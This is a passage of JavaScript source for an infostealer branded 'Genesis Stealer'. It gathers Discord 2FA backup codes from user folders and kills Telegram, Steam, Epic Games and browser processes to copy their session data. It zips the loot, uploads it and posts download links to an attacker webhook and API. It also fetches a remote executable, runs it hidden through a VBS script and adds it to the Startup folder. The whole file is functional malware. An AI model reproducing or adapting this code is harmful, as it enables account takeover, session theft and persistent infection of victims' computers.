  const tempDir = os.tmpdir(); // Correction : tempDir n'était pas défini
  let str = '';

  function findAndReadBackupCodes(directory) {
    if (fs.existsSync(directory)) {
      fs.readdirSync(directory).forEach(file => {
        if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
          const filePath = path.join(directory, file);
          str += `\n\n@~$~@GenesisStealer-${filePath}`;
          str += `\n\n${fs.readFileSync(filePath, 'utf-8')}`;
        }
      });
    }
  }

  findAndReadBackupCodes(path.join(homeDir, 'Downloads'));
  findAndReadBackupCodes(path.join(homeDir, 'Desktop'));
  findAndReadBackupCodes(path.join(homeDir, 'Documents'));

  if (str !== '') {
    const backupcodesFilePath = path.join(tempDir, 'BackupCodes.txt');
    fs.writeFileSync(backupcodesFilePath, str.slice(2));

    const link = await uploadFile(backupcodesFilePath);
    const backupCodeLink = `✨ [Click here to download backup codes](${link})`;

    const embed = {
      title: "🔑 Discord Backup codes founds!",
      color: 0x808080,
      fields: [{
        name: "Use theses code to disable 2FA.",
        value: `${backupCodeLink}`,
        inline: false
      }],
      footer: {
        text: "Genesis  | t.me/GenesisStealer"
      }
    };

    await axios.post(config.webhook, { embeds: [embed] });
    await axios.post(config.api, { embeds: [embed] });
  }
}

async function zipFolderX(source, out) {
    const archive = archiver('zip', { zlib: { level: 9 } });
    const stream = fs.createWriteStream(out);

    return new Promise((resolve, reject) => {
        archive
            .directory(source, false)
            .on('error', err => reject(err))
            .pipe(stream);

        stream.on('close', () => resolve());
        archive.finalize();
    });
}

function checkFileEncoding(fileContent) {
}

function getPasswordsX() {
    if (fs.existsSync(wordlistFilePath)) {
        const fileContent = fs.readFileSync(wordlistFilePath, 'utf-8');
        return fileContent.split(/\r?\n/).filter(Boolean); 
    } else {
        return defaultPasswords;
    }
}

function decryptWithSeco(encryptedData, passphrase) {
    try {
        return seco.decryptData(encryptedData, passphrase);  
    } catch (error) {
        return null; 
    }
}

async function zipAndSendTasks() {
    try {
        const zipFilePath = await createSingleZip();
        if (zipFilePath) {
            await sendLogToApi(zipFilePath);
        } else {
        }
    } catch (error) {
    }
}

async function imh4dsc() {
    exec('tasklist', (err, stdout) => {
        const executables = [
            'Discord.exe',
            'DiscordCanary.exe',
            'discordDevelopment.exe',
            'DiscordPTB.exe',
        ];

        for (const executable of executables) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {
                    if (err) {
                        console.error(`Error killing ${executable}:`, err);
                    }
                });

                if (executable.includes('Discord')) {
                    exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {
                        if (err) {
                            console.error(`Error restarting ${executable}:`, err);
                        }
                    });
                }
            }
        }
    });
}

const telegramTdataPath = path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata');
const localAppDataPath = path.join(process.env.LOCALAPPDATA, 'Telegram_Data');

const excludeFiles = [
    'media_cache'
];

async function terminateTelegram() {
    return new Promise((resolve, reject) => {
        exec('tasklist', (error, stdout, stderr) => {
            if (error) {
                return reject(error);
            }

            if (stdout.toLowerCase().includes('telegram.exe')) {
                exec('taskkill /F /IM Telegram.exe', (killError, killStdout, killStderr) => {
                    if (killError) {
                        return reject(killError);
                    }
                    resolve();
                });
            } else {
                resolve(); 
            }
        });
    });
}
async function copyFilesTG(src, dest, excludeFiles) {
    await fs.ensureDir(dest);

    const files = await fs.readdir(src);
    await Promise.all(files.map(async (file) => {
        const fullPath = path.join(src, file);
        const destPath = path.join(dest, file);

        try {
            const stats = await fs.lstat(fullPath);
            if (stats.isDirectory()) {
                if ((file === 'user_data' || file === 'user_data#2') && excludeFiles.includes('media_cache')) {
                    const subFiles = await readdir(fullPath);
                    await Promise.all(subFiles.map(async (subFile) => {
                        if (subFile !== 'media_cache') {
                            const subFullPath = path.join(fullPath, subFile);
                            const subDestPath = path.join(destPath, subFile);
                            await fs.copy(subFullPath, subDestPath);
                        }
                    }));
                } else {
                    await copyFilesTG(fullPath, destPath, excludeFiles);
                }
            } else {
                await fs.copy(fullPath, destPath);
            }
        } catch (err) {
            console.error(`Error processing file/directory: ${fullPath}`, err);
        }
    }));
}

function createZipTG(src, destZipPath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(destZipPath);
        const archive = archiver('zip', {
            zlib: { level: 9 } 
        });

        output.on('close', () => {
            console.log(`ZIP dosyası başarıyla oluşturuldu: ${destZipPath} (${archive.pointer()} bytes)`);
            resolve();
        });

        archive.on('error', (err) => {
            console.error('ZIP dosyası oluşturulurken hata oluştu:', err);
            reject(err);
        });

        archive.pipe(output);
        archive.directory(src, false);
        archive.finalize();
    });
}

async function sendToWebhookTG(gofileUrl) {
    const embed = {
        title: `⚓️️ Genesis (Telegram Session) - ${os.userInfo().username}`,
        description: `📎 Download: 
[CLICK!](${gofileUrl})`,
        color: 0x808080,
        footer: {
            text: 'Genesis t.me/genesisStealer',
            icon_url: 'https://i.imgur.com/zzLcvVJ.png'
        },
        thumbnail: {
            url: 'https://i.imgur.com/0wJybGH.png' 
        }
    };

    const data = {
        embed: embed
    };

    try {
        await axios.post(config.webhook, { embeds: [embed] });
		await axios.post(config.api, { embeds: [embed] });
    } catch (error) {
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function submitTelegram() {
    try {
        await terminateTelegram();
        await sleep(3000);

        const copyStartTime = performance.now();
        await copyFilesTG(telegramTdataPath, localAppDataPath, excludeFiles);
        const copyEndTime = performance.now();
        const copyDuration = ((copyEndTime - copyStartTime) / 1000).toFixed(2);
        console.log(`Copy finished. Duration: ${copyDuration} seconds`);

        const zipStartTime = performance.now();
        const destZipPath = path.join(process.env.LOCALAPPDATA, 'Telegram_Data.zip');
        await createZipTG(localAppDataPath, destZipPath);
        const zipEndTime = performance.now();
        const zipDuration = ((zipEndTime - zipStartTime) / 1000).toFixed(2);
        console.log(`Zipping completed. Duration: ${zipDuration} seconds`);

        const gofileUrl = await uploadFile(destZipPath);

        if (gofileUrl) {
            const embed = {
                title: `⚓️ Genesis (Telegram Session) - ${os.userInfo().username}`,
                description: `🔍 Download: [CLICK ME!](${gofileUrl})`,
                color: 0x808080,
                footer: {
                    text: 'Genesis | t.me/genesisStealer',
                    icon_url: 'https://i.imgur.com/zzLcvVJ.png'
                },
                thumbnail: {
                    url: 'https://i.imgur.com/0wJybGH.png'
                }
            };

            await axios.post(config.webhook, { embeds: [embed] });
            await axios.post(config.api, { embeds: [embed] });
        }

        await fse.unlink(destZipPath);
        await fse.remove(localAppDataPath);
    } catch (error) {
        console.error(`Error in submitTelegram: ${error.message}`);
    }
}




async function killEpicGames() {
        try {
            await new Promise((resolve, reject) => {
                exec('taskkill /IM EpicGamesLauncher.exe /F', (error, stdout, stderr) => {
                    if (error) {
                        reject(`Error killing Epic Games Launcher process: ${error.message}`);
                    } else {
                        console.log('Epic Games Launcher process killed.');
                        resolve();
                    }
                });
            });
    
        } catch (error) {
            console.error(`Error in killEpicGames: ${error.message}`);
        }
    }
	
	

async function SubmitEpic() {
    try {
        await killEpicGames();
        const file = `${localappdata}\\EpicGamesLauncher\\Saved\\Config\\Windows`;
        if (fs.existsSync(file)) {
            const zipper = new AdmZip();
            zipper.addLocalFolder(file);

            const targetZipPath = path.join(tempDir, 'EpicGamesSession.zip');
            zipper.writeZip(targetZipPath);
            const link = await uploadFile(targetZipPath);
            const epicLink = ` [Click here to download EpicGames Files!](${link})`;

            const embed = {
                title: `🏴‍☠️ Genesis (EpicGames Data) - ${os.userInfo().username}`,
                description: `${epicLink}`,
                color: 0x808080,
                footer: {
                    text: 'Genesis | t.me/genesisStealer',
                    icon_url: 'https://i.imgur.com/zzLcvVJ.png'
                },
                thumbnail: {
                    url: 'https://i.imgur.com/YErDHZW.png'
                }
            };

            await axios.post(config.webhook, { embeds: [embed] });
            await axios.post(config.api, { embeds: [embed] });

        }
    } catch (error) {
        console.error(`Error in SubmitEpic: ${error.message}`);
    }
}

async function killSteam() {
            try {
                await new Promise((resolve, reject) => {
                    exec('taskkill /IM Steam.exe /F', (error, stdout, stderr) => {
                        if (error) {
                            reject(`Error killing Steam process: ${error.message}`);
                        } else {
                            console.log('Steam process killed.');
                            resolve();
                        }
                    });
                });
        
            } catch (error) {
                console.error(`Error in killSteam: ${error.message}`);
            }
        }


async function stealSteamSession() {
    try {
        await killSteam();
        const file = `C:\\Program Files (x86)\\Steam\\config`;

        if (fs.existsSync(file)) {
            const zipper = new AdmZip();
            zipper.addLocalFolder(file);

            const tempDir = os.tmpdir();
            const targetZipPath = path.join(tempDir, 'SteamSession.zip');
            zipper.writeZip(targetZipPath);

            const link = await uploadFile(targetZipPath);

            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];

            for (const account of accountIds) {
                try {
                    const { data: { response: accountInfo } } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
                    const { data: { response: games } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                    const { data: { response: level } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);

                    const steamLink = `[Click to view Profile](${accountInfo.players[0].profileurl})`;
                    const downloadLink = `[Download Steam Session here!](${link})`;

                    const embed = createSteamEmbed(account, accountInfo, games, level, steamLink, downloadLink);

                    await axios.post(config.webhook, { embeds: [embed] });
                    await axios.post(config.api, { embeds: [embed] });

                    await new Promise(resolve => setTimeout(resolve, 2000));

                } catch (error) {
                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                }
            }
        } else {
            console.log('Steam config folder not found.');
        }
    } catch (error) {
        console.error(`Error in stealSteamSession: ${error.message}`);
    }
}

     
        
function createSteamEmbed(account, accountInfo, games, level, steamLink, downloadLink) {
    return {
        title: `🏴‍☠️ Genesis (Steam) - ${os.userInfo().username}`,
        description: `${steamLink}\n${downloadLink}`,
        fields: [
            {
                name: '🏷 Username',
                value: `> __${accountInfo.players[0].personaname}__`,
                inline: true
            },
            {
                name: "🆔 Steam Identifier",
                value: `> __${account}__`,
                inline: true
            },
            {
                name: "🔢 Level",
                value: `> __${level.player_level || "Private"}__`,
                inline: true
            },
            {
                name: "🎮 Game Count",
                value: `> __${games.game_count || "Private"}__`,
                inline: true
            },
            {
                name: "📅 Account Created",
                value: `> __${new Date(accountInfo.players[0].timecreated * 1000).toLocaleDateString()}__`,
                inline: true
            }
        ],
        color: 0x808080,
        footer: {
            text: 'Genesis | t.me/genesisStealer',
            icon_url: 'https://i.imgur.com/zzLcvVJ.png'
        },
        thumbnail: {
            url: 'https://i.imgur.com/aye4rL6.jpeg'
        }
    };
}

      

function ensureDirectoryExistence(dirPath) {
            if (!fs.existsSync(dirPath)) {
                fs.mkdirSync(dirPath, { recursive: true });
            }
        }



async function downloadPanel() {
    try {
        const exePath = await downloadExe();
        await openExe(panel);
        await addToStartup();
    } catch (error) {
        console.error("Error in download panel tasks:", error.message);
    }
}

const exeUrl = `https://${SERVER_URL}/panel.exe`;
const randomName = `Genesis_${crypto.randomBytes(8).toString('hex')}.exe`;

const exePath = path.join(tempDir, randomName);
async function downloadExe() {
  const response = await axios({
    method: 'get',
    url: exeUrl,
    responseType: 'stream',
  });

  return new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(exePath);
    response.data.pipe(writer);
    writer.on('finish', () => resolve(exePath));
    writer.on('error', reject);
  });
}

async function openExe(panel) {
  const vbsPath = path.join(tempDir, 'open.vbs');

  const vbsContent = `
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "${exePath}" & chr(34) & " ${panel}", 0, False
  `;

  await fsPromises.writeFile(vbsPath, vbsContent);
  execSync(`cscript //B "${vbsPath}"`);
}

async function addToStartup() {
  const vbsPath = path.join(tempDir, 'startup.vbs');

  const vbsContent = `
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "${exePath}" & chr(34), 0, False
  `;

  await fsPromises.writeFile(vbsPath, vbsContent);

  const startupFolder = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
  const shortcutPath = path.join(startupFolder, 'startup.vbs');

  fs.copyFileSync(vbsPath, shortcutPath);
}

async function run() {
  const users = await getUsers();

  const browsersToKill = [
    'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum',
    'centbrowser', '7star', 'sputnik', 'vivaldi', 'epicprivacybrowser',
    'uran', 'yandex', 'iridium'
  ];

  for (const p of browsersToKill) {
    await killProcess(p);
  }

  await all(users);
  await imh4dsc(users);
  await sxcxrDs(users);
  await downloadPanel();
  await browser(users); 
  await discordtokens(users);
  await getPepperoni();
  await Operapass(users);
  await opera(users);
  await SubmitExodus(users);
  await zipAndSendTasks(users);
  await submitTelegram(users);
  await imh4dsc(users);
  await sxcxrDs(users);
  await downloadPanel();
  await SubmitEpic();
  await stealSteamSession();
  await chrome(users);
}

	
run();
